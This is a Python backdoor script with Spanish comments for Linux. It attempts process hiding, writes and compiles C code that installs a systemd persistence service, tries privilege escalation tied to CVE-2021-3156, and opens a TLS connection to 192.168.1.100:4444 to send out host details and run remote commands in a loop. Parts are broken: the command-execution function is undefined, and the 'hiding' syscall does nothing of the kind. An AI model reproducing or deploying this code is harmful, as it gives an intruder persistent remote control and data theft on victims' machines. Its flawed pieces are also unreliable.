
import os
import platform
import socket
import ssl
import subprocess
from datetime import datetime
import ctypes
from ctypes import CDLL

# Cargar la biblioteca C para llamadas de bajo nivel
libc = CDLL("libc.so.6")

def hide_process():
    try:
        libc.syscall(63, os.getpid(), 63)
        log_event("Proceso oculto exitosamente.")
    except Exception as e:
        log_event(f"Error al ocultar el proceso: {e}")

def compile_and_run_persistence():
    persistence_code = '''
    #include <stdio.h>
    #include <stdlib.h>

    void create_persistence() {
        system("echo '[Unit]' > /etc/systemd/system/persistencia.service");
        system("echo 'Description=Servicio de Persistencia' >> /etc/systemd/system/persistencia.service");
        system("echo '[Service]' >> /etc/systemd/system/persistencia.service");
        system("echo 'ExecStart=/usr/bin/python3 /usr/local/bin/persistence_script.py' >> /etc/systemd/system/persistencia.service");
        system("echo 'Restart=always' >> /etc/systemd/system/persistencia.service");
        system("echo '[Install]' >> /etc/systemd/system/persistencia.service");
        system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/persistencia.service");

        system("systemctl enable persistencia.service");
        system("systemctl start persistencia.service");
    }

    int main() {
        create_persistence();
        return 0;
    }
    '''

    with open("/tmp/persistence.c", "w") as f:
        f.write(persistence_code)
    
    os.system("gcc /tmp/persistence.c -o /tmp/persistence")
    os.system("/tmp/persistence")
    log_event("Persistencia creada mediante código C.")

def log_event(event_message):
    log_file = "/var/log/system_service.log"
    with open(log_file, "a") as log:
        log.write(f"{datetime.now().isoformat()} - {event_message}\n")

def get_system_info():
    info = {
        "os_name": platform.system(),
        "os_version": platform.version(),
        "hostname": socket.gethostname(),
        "processor": platform.processor(),
        "architecture": platform.architecture()[0],
        "user": os.getlogin(),
        "ip_address": socket.gethostbyname(socket.gethostname())
    }
    return info

def establish_secure_connection(host, port):
    context = ssl.create_default_context()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_socket = context.wrap_socket(s, server_hostname=host)
    try:
        secure_socket.connect((host, port))
        log_event("Conexión segura establecida.")
        return secure_socket
    except Exception as e:
        log_event(f"Error al establecer la conexión segura: {e}")
        return None

def scan_vulnerabilities():
    vulnerabilities = []
    if "Ubuntu" in platform.version():
        vulnerabilities.append("CVE-2021-3156")
    return vulnerabilities

def escalate_privileges():
    try:
        result = subprocess.check_output("sudo -u root /bin/bash", shell=True)
        if b"root" in result:
            log_event("Privilegios escalados exitosamente.")
            return True
        else:
            log_event("Falló la escalación de privilegios.")
            return False
    except Exception as e:
        log_event(f"Error al intentar escalar privilegios: {e}")
        return False

def main():
    hide_process()
    compile_and_run_persistence()

    vulns = scan_vulnerabilities()
    if "CVE-2021-3156" in vulns:
        escalate_privileges()

    host = "192.168.1.100"
    port = 4444

    conn = establish_secure_connection(host, port)
    if conn:
        system_info = get_system_info()
        conn.send(str(system_info).encode())
        while True:
            try:
                command = conn.recv(1024).decode()
                if command.lower() == "exit":
                    break
                output = execute_kernel_command(command)
                conn.send(output.encode())
            except Exception as e:
                conn.send(str(e).encode())
                break

if __name__ == "__main__":
    main()
